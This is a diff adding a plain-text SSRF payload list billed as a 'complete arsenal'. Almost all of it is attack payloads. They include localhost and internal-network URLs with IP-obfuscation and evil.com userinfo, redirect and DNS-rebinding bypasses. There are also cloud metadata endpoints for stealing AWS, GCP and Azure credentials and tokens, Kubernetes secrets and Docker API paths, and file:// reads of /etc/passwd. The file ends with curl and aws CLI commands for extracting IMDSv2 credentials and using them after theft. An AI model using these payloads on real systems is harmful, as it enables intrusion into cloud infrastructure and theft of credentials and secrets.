@@ -1,0 +1,322 @@
+================================================================================
+SERVER-SIDE REQUEST FORGERY (SSRF) PAYLOADS - COMPLETE ARSENAL
+================================================================================
+
+================================================================================
+BASIC SSRF PAYLOADS (Localhost Access)
+================================================================================
+
+http://localhost/ – Basic localhost access
+http://localhost:80/ – Localhost port 80
+http://localhost:443/ – Localhost HTTPS
+http://127.0.0.1/ – Loopback IP access
+http://127.0.0.1:80/ – Loopback port 80
+http://0.0.0.0/ – Zero address
+http://[::1]/ – IPv6 localhost
+http://localhost:8080/ – Alternative port
+http://localhost:3000/ – Common dev port
+http://localhost:5000/ – Flask default port
+http://localhost:8000/ – Django default port
+http://localhost:9200/ – Elasticsearch
+http://localhost:5432/ – PostgreSQL
+http://localhost:3306/ – MySQL
+http://localhost:6379/ – Redis
+http://localhost:27017/ – MongoDB
+http://localhost:11211/ – Memcached
+http://localhost:2375/ – Docker API
+http://localhost:9090/ – Prometheus
+http://localhost:5601/ – Kibana
+http://localhost:8081/ – Alternative dev port
+
+================================================================================
+ADVANCED LOCALHOST BYPASS TECHNIQUES
+================================================================================
+
+http://0/ – Shortened zero address
+http://127.0.0.1.nip.io/ – Nip.io DNS resolution
+http://localhost.localdomain/ – Localhost domain variant
+http://localhost. – Trailing dot bypass
+http://localhost@evil.com/ – User info bypass
+http://evil.com@localhost/ – Reverse user info
+http://localhost#@evil.com/ – Fragment bypass
+http://evil.com#@localhost/ – Reverse fragment
+http://localhost.evil.com/ – Subdomain variant
+http://evil.com.localhost/ – Subdomain reverse
+http://127.0.0.1.nip.io:80/ – Nip.io with port
+
+================================================================================
+IP ADDRESS OBFUSCATION BYPASSES
+================================================================================
+
+http://2130706433/ – Decimal IP (127.0.0.1)
+http://0x7f000001/ – Hexadecimal IP
+http://0177.0.0.1/ – Octal IP
+http://0177.0000.0000.0001/ – Octal with zeros
+http://127.0.1/ – Shortened form
+http://127.0000.0000.0001/ – Zero-padded
+http://0x7f.0x0.0x0.0x1/ – Mixed hex
+http://127.0.0.1:80/ – With standard port
+http://127.0.0.1:443/ – With HTTPS port
+http://[::ffff:127.0.0.1]/ – IPv4-mapped IPv6
+http://[::ffff:7f00:0001]/ – IPv6 hex mapped
+http://[0:0:0:0:0:ffff:127.0.0.1]/ – Full IPv6 mapped
+http://[::1]/ – IPv6 localhost
+
+================================================================================
+INTERNAL NETWORK IP SCANNING PAYLOADS
+================================================================================
+
+http://10.0.0.0/ – Class A private network start
+http://10.0.0.1/ – Common router IP
+http://10.0.0.2/ – Network scanning
+http://10.255.255.255/ – Class A end
+http://172.16.0.1/ – Class B private start
+http://172.31.255.255/ – Class B private end
+http://192.168.0.1/ – Class C common router
+http://192.168.1.1/ – Common home router
+http://192.168.1.100/ – Common device range
+http://192.168.255.255/ – Class C end
+http://169.254.169.254/ – Link-local (AWS metadata)
+http://169.254.0.1/ – APIPA range start
+http://169.254.255.255/ – APIPA range end
+
+================================================================================
+AWS METADATA SSRF PAYLOADS (IMDSv1)
+================================================================================
+
+http://169.254.169.254/latest/meta-data/ – Root metadata
+http://169.254.169.254/latest/meta-data/ami-id – AMI ID
+http://169.254.169.254/latest/meta-data/ami-launch-index – Launch index
+http://169.254.169.254/latest/meta-data/ami-manifest-path – Manifest path
+http://169.254.169.254/latest/meta-data/hostname – Instance hostname
+http://169.254.169.254/latest/meta-data/instance-id – Instance ID
+http://169.254.169.254/latest/meta-data/instance-type – Instance type
+http://169.254.169.254/latest/meta-data/local-hostname – Local hostname
+http://169.254.169.254/latest/meta-data/local-ipv4 – Local IP
+http://169.254.169.254/latest/meta-data/mac – MAC address
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/ – Network interfaces
+http://169.254.169.254/latest/meta-data/public-hostname – Public hostname
+http://169.254.169.254/latest/meta-data/public-ipv4 – Public IP
+http://169.254.169.254/latest/meta-data/security-groups – Security groups
+http://169.254.169.254/latest/meta-data/placement/availability-zone – AZ
+http://169.254.169.254/latest/meta-data/placement/region – Region
+http://169.254.169.254/latest/user-data – User data script
+http://169.254.169.254/latest/meta-data/iam/security-credentials/ – IAM role list
+http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME – IAM credentials
+http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance – EC2 credentials
+http://169.254.169.254/latest/meta-data/block-device-mapping/ – Block device mapping
+
+================================================================================
+AWS METADATA SSRF PAYLOADS (IMDSv2 - Token Required)
+================================================================================
+
+PUT http://169.254.169.254/latest/api/token – Token request (requires PUT)
+X-aws-ec2-metadata-token-ttl-seconds: 21600 – Token TTL header
+http://169.254.169.254/latest/meta-data/ – With token header
+X-aws-ec2-metadata-token: TOKEN_VALUE – Token in request
+
+================================================================================
+GCP METADATA SSRF PAYLOADS
+================================================================================
+
+http://metadata.google.internal/computeMetadata/v1/ – Root metadata
+Metadata-Flavor: Google – Required header
+http://metadata.google.internal/computeMetadata/v1/instance – Instance info
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/ – Service accounts
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email – Service email
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token – OAuth token
+http://metadata.google.internal/computeMetadata/v1/instance/hostname – Hostname
+http://metadata.google.internal/computeMetadata/v1/instance/id – Instance ID
+http://metadata.google.internal/computeMetadata/v1/instance/zone – Zone
+http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/ – Network info
+http://metadata.google.internal/computeMetadata/v1/project/project-id – Project ID
+http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id – Numeric project ID
+http://169.254.169.254/computeMetadata/v1/ – Alternative endpoint
+http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token – Alternative token endpoint
+
+================================================================================
+AZURE METADATA SSRF PAYLOADS
+================================================================================
+
+http://169.254.169.254/metadata/instance?api-version=2017-08-01 – Azure instance metadata
+Metadata: true – Required header
+http://169.254.169.254/metadata/instance/compute?api-version=2017-08-01 – Compute info
+http://169.254.169.254/metadata/instance/network?api-version=2017-08-01 – Network info
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/ – OAuth token
+http://169.254.169.254/metadata/instance/compute/name – VM name
+http://169.254.169.254/metadata/instance/compute/resourceGroupName – Resource group
+http://169.254.169.254/metadata/instance/compute/subscriptionId – Subscription ID
+http://169.254.169.254/metadata/instance/compute/location – Region
+
+================================================================================
+DOCKER API SSRF PAYLOADS
+================================================================================
+
+http://localhost:2375/version – Docker API version
+http://localhost:2375/containers/json – List containers
+http://localhost:2375/containers/{id}/json – Container info
+http://localhost:2375/images/json – List images
+http://localhost:2375/containers/{id}/logs?stdout=true – Container logs
+http://172.17.0.1:2375/version – Docker bridge IP
+http://host.docker.internal:2375/version – Docker for Mac/Windows
+
+================================================================================
+KUBERNETES API SSRF PAYLOADS
+================================================================================
+
+https://kubernetes.default.svc/ – Kubernetes API (requires token)
+https://kubernetes.default.svc/api/v1/namespaces/default/pods – List pods
+https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets – Secrets
+https://kubernetes.default.svc/api/v1/namespaces/default/secrets – Namespace secrets
+https://kubernetes.default.svc/api/v1/nodes – List nodes
+https://kubernetes.default.svc/api/v1/services – List services
+https://kubernetes.default.svc/api/v1/namespaces/default/services – Namespace services
+http://localhost:8001/api/v1/namespaces/default/pods – Kube proxy port
+http://localhost:10250/pods – Kubelet API
+http://localhost:10255/pods – Read-only Kubelet
+
+================================================================================
+INTERNAL SERVICE DISCOVERY PAYLOADS
+================================================================================
+
+http://localhost:8080/ – Tomcat/Jenkins
+http://localhost:8080/manager/html – Tomcat manager
+http://localhost:8080/jenkins/ – Jenkins
+http://localhost:9090/ – Prometheus
+http://localhost:9090/metrics – Prometheus metrics
+http://localhost:3000/ – Grafana
+http://localhost:5601/ – Kibana
+http://localhost:9200/_cat/indices – Elasticsearch indices
+http://localhost:9200/_cluster/health – ES cluster health
+http://localhost:6379/INFO – Redis info
+http://localhost:11211/stats – Memcached stats
+http://localhost:27017/ – MongoDB (requires protocol)
+http://localhost:5432/ – PostgreSQL (requires protocol)
+http://localhost:3306/ – MySQL (requires protocol)
+http://localhost:15672/ – RabbitMQ
+http://localhost:15672/api/queues – RabbitMQ queues
+http://localhost:8500/v1/agent/services – Consul services
+http://localhost:8500/v1/catalog/services – Consul catalog
+http://localhost:2379/version – Etcd version
+http://localhost:2379/v2/keys/ – Etcd keys
+http://localhost:4001/version – Old Etcd
+http://localhost:10250/pods – Kubelet (requires token)
+http://localhost:10251/ – Kube-scheduler metrics
+http://localhost:10252/ – Kube-controller-manager
+
+================================================================================
+CLOUD STORAGE SSRF PAYLOADS
+================================================================================
+
+http://169.254.169.254/latest/meta-data/iam/security-credentials/ – AWS IAM
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token – GCP token
+http://169.254.169.254/metadata/identity/oauth2/token – Azure token
+https://s3.amazonaws.com/ – S3 bucket access (if credentials stolen)
+http://100.100.100.200/latest/meta-data/ – Alibaba Cloud metadata
+http://169.254.169.254/v1/ – DigitalOcean metadata
+http://192.0.0.192/latest/meta-data/ – Oracle Cloud metadata
+
+================================================================================
+URL SCHEME BYPASS PAYLOADS
+================================================================================
+
+file:///etc/passwd – File scheme read
+file:///c:/windows/win.ini – Windows file read
+file:///var/www/html/config.php – Web config read
+dict://localhost:11211/ – Dict protocol
+dict://localhost:11211/stat – Dict stats
+dict://localhost:11211/set key 0 0 5 – Dict set command
+gopher://localhost:8080/_GET / HTTP/1.0%0A%0A – Gopher GET request
+gopher://localhost:8080/_POST / HTTP/1.0%0AContent-Length: 5%0A%0Adata – Gopher POST
+ftp://localhost:21/ – FTP protocol
+ftp://localhost:21/pub – FTP directory listing
+tftp://localhost/foo – TFTP protocol
+ldap://localhost:389/ – LDAP protocol
+ldaps://localhost:636/ – LDAPS protocol
+smtp://localhost:25/ – SMTP protocol
+smtps://localhost:465/ – SMTPS protocol
+mysql://localhost:3306/ – MySQL protocol
+redis://localhost:6379/ – Redis protocol
+
+================================================================================
+REDIRECT-BASED SSRF PAYLOADS (302 Bypass)
+================================================================================
+
+http://evil.com/redirect-to-localhost – External redirect to internal
+http://127.0.0.1/redirect?url=http://169.254.169.254/ – Redirect chain
+http://evil.com/meta-refresh – Meta refresh redirect
+http://localhost/redirect?url=http://169.254.169.254/ – Self redirect
+http://evil.com/302?url=http://169.254.169.254/ – 302 redirect
+
+================================================================================
+DNS REBINDING SSRF PAYLOADS
+================================================================================
+
+http://rebind.network/127.0.0.1 – DNS rebinding service
+http://1u.112.2o7b.net/127.0.0.1 – Another rebinding service
+http://rebind.it/ – Rebind domain
+http://localhost.rebind.network/ – Subdomain rebind
+http://rar.rebind.network/ – Random rebind
+
+================================================================================
+SSRF RESPONSE INDICATORS (What to Look For)
+================================================================================
+
+ami-id – AWS AMI identifier
+instance-id – AWS instance identifier
+role-name – AWS IAM role
+AccessKeyId – AWS credential
+SecretAccessKey – AWS secret
+Token – AWS session token
+computeMetadata – GCP metadata
+project-id – GCP project ID
+access_token – OAuth token
+refresh_token – Refresh token
+compute – Azure compute metadata
+resourceGroupName – Azure resource group
+subscriptionId – Azure subscription
+"Version" – Docker API version
+"Containers" – Docker containers list
+"Items" – Kube API response
+"kind": "PodList" – Kubernetes pods
+"metrics" – Prometheus data
+"_index" – Elasticsearch index
+
+================================================================================
+ERROR-BASED SSRF DETECTION PAYLOADS
+================================================================================
+
+http://localhost:99999/ – Invalid port (connection refused)
+http://invalid.doesnotexist.xxx/ – DNS error
+http://localhost:65536/ – Port out of range
+http://10.255.255.255:99999/ – Unreachable private IP
+http://169.254.254.254/ – Invalid metadata IP
+http://localhost:12345/doesnotexist – 404 Not Found
+
+================================================================================
+ADVANCED SSRF TOOLS AND CREDENTIAL EXTRACTION
+================================================================================
+
+curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" – IMDSv2 token
+curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ – Use token
+aws sts assume-role – STS role assumption after credential theft
+# Extracted IAM credentials can be used with:
+aws configure set aws_access_key_id ASIA...
+aws configure set aws_secret_access_key SECRET...
+aws configure set aws_session_token TOKEN...
+aws s3 ls – Access S3 buckets
+aws ec2 describe-instances – Describe EC2 instances
+
+================================================================================
+REAL-WORLD SSRF NOTABLE PAYLOADS
+================================================================================
+
+http://169.254.169.254/latest/user-data – Capital One breach (2019)
+http://169.254.169.254/latest/meta-data/iam/security-credentials/ – AWS metadata theft
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token – GCP token theft
+http://169.254.169.254/metadata/identity/oauth2/token – Azure token theft
+https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets – K8s secret theft
+
+================================================================================
+END OF SSRF PAYLOADS
+================================================================================
